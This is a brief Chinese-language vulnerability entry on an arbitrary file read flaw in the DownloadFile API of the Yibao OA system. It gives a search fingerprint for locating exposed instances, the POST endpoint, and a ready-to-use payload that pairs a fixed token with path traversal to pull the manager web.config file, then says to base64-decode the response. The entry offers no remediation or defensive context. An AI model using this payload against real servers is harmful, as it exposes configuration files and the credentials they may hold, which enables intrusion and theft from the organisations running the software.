# 易宝OA系统DownloadFile接口存在文件读取漏洞

易宝OA系统DownloadFile接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product="顶讯科技-易宝OA系统"`
- **请求**：`POST /api/files/DownloadFile HTTP/1.1`

**Payload**
```
token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
响应包base64解码
```